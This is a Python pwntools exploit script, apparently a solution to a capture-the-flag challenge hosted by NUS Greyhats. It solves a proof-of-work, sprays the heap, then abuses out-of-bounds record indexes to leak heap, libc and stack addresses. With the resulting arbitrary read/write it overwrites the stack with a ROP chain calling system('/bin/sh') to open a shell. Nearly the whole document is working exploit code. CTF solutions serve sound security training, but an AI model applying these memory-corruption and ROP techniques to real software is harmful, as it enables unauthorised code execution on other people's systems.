from pwn import *
from tqdm import tqdm
import hashlib
import os

elf = context.binary = ELF("chall")
libc = elf.libc
if args.REMOTE:
	p = remote("challs3.nusgreyhats.org", 35128)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

def pow_solver(p):
    p.recvuntil(b"sha256(")
    challenge = p.recvuntil(b" + ", drop=True)
    p.recvuntil(b"(")
    difficulty = int(p.recvuntil(b")", drop=True))
    answer = 0
    log.info(f"finding pow for {challenge.decode()}, {difficulty}")
    while True:
        answer += 1
        h = hashlib.sha256()
        h.update(challenge + str(answer).encode())
        bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest())
        if bits.startswith('0' * difficulty):
            break
    p.sendlineafter(b"answer: ", str(answer).encode())
    log.success("PoW solved!")


def alloc(sz):
    sla(b"=\n", b"1")
    sla(b"$", str(sz).encode())

def write(idx, buf):
    sla(b"=\n", b"2")
    sla(b"update: ", str(idx).encode())
    sla(b"records: ", buf)

def read(idx):
    sla(b"=\n", b"3")
    sla(b"examine: ", str(idx).encode())

def delete(idx):
    sla(b"=\n", b"4")
    sla(b"foreclosure: ", str(idx).encode())
    sla(b"> ", b"y")

def check(idx):
    sla(b"=\n", b"4")
    sla(b"foreclosure: ", str(idx).encode())
    x = rl()
    if b"Invalid" in x:
        return False
    else:
        sla(b"> ", b"n")
        return True


if args.POW:
    pow_solver(p)

# first we spray 1 GB of memory onto the heap
# since the heap is allocated between (0, 1GB) away from the end of .bss
# after spraying, we can always access heap memory at 1GB offset away from .bss.
# https://elixir.bootlin.com/linux/v6.15.3/source/include/linux/sizes.h#L51

for n in tqdm(range(0x4000)):
    if n > 1 and n % 0x100 == 0:
        alloc(-1)
    alloc(0x10000-0x10)

alloc(123) # overwrite our `n` with a large value

# free some chunks into unsorted bin so we can leak some addresses

for n in range(0x100):
    if (n % 2 == 0):
        delete(n)

# we need to scan the memory to find the 1 nibble of ASLR where our chunk is allocated

log.info(f"finding the right alignment for our heap chunks")

idx = 0x800004a
for i in range(16):
    c = check(idx+i*512+1)
    print(idx+i*512+1, i, c)
    if c:
        idx += i*512
        break

# scan our heap for our unsorted bin pointers

log.info(f"finding our last 256 allocations for leaks")

while not check(idx+2):
    idx += 0x2000

# now we can leak our heap address

read(idx+2)
p.recvuntil(b"details: ")
leak = unpack(p.recvuntil(b"\n", drop=True), "all")
log.info(f"heap leak @ {hex(leak)}")

# hereon out, we have easy arbitrary read/write by giving large OOB indexes

write(1, p64(leak-0x20078))
read(idx+2+0x2000)
p.recvuntil(b"details: ")
libc.address = unpack(p.recvuntil(b"\n", drop=True), "all") - 2206944
log.info(f"libc base @ {hex(libc.address)}")

write(1, p64(libc.sym.environ))
read(idx+2+0x2000)
p.recvuntil(b"details: ")
stack_leak = unpack(p.recvuntil(b"\n", drop=True), "all")
log.info(f"stack leak @ {hex(stack_leak)}")

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

write(1, p64(stack_leak-288-0x64))
write(idx+2+0x2000, b"A"*20 + rop.chain())

# shell!

p.interactive()
